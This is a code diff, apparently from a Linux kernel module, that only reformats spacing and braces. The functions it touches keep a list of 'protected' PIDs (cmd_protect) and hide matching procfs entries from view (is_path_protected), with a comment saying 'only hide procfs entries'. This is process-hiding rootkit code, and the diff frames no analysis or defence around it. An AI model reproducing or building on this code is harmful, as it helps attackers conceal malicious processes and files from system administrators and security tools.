@@ -14,16 +14,16 @@ struct protect_status {
     .count = 0,
 };
 
-bool is_path_protected(struct path *p){
-  pid_t curpid = 0;
-  uint64_t i = 0;
+bool is_path_protected(struct path *p) {
+  pid_t    curpid = 0;
+  uint64_t i      = 0;
 
-  for(;i < pst.count; i++){
-    if(kstrtos32(p->dentry->d_name.name, 10, &curpid) != 0)
+  for (; i < pst.count; i++) {
+    if (kstrtos32(p->dentry->d_name.name, 10, &curpid) != 0)
       continue;
 
     // only hide procfs entries
-    if(strcmp(p->mnt->mnt_sb->s_type->name, "proc") == 0 && pst.list[i] == curpid)
+    if (strcmp(p->mnt->mnt_sb->s_type->name, "proc") == 0 && pst.list[i] == curpid)
       return true;
   }
 
@@ -121,17 +121,17 @@ bool is_inode_protected(uint64_t inode) {
   return false;
 }
 
-bool cmd_protect(char *arg, uint64_t len){
-  if(len != sizeof(pid_t))
+bool cmd_protect(char *arg, uint64_t len) {
+  if (len != sizeof(pid_t))
     return false;
 
-  if(NULL == pst.list)
-    pst.list = (void*)kmalloc(++pst.count*sizeof(pid_t), GFP_KERNEL);
+  if (NULL == pst.list)
+    pst.list = (void *)kmalloc(++pst.count * sizeof(pid_t), GFP_KERNEL);
   else
-    pst.list = (void*)krealloc(pst.list, ++pst.count*sizeof(pid_t), GFP_KERNEL);
+    pst.list = (void *)krealloc(pst.list, ++pst.count * sizeof(pid_t), GFP_KERNEL);
 
-  memcpy(&pst.list[pst.count-1], arg, len);
-  debgf("protecting PID: %d", pst.list[pst.count-1]);
+  memcpy(&pst.list[pst.count - 1], arg, len);
+  debgf("protecting PID: %d", pst.list[pst.count - 1]);
 
   return true;
 }
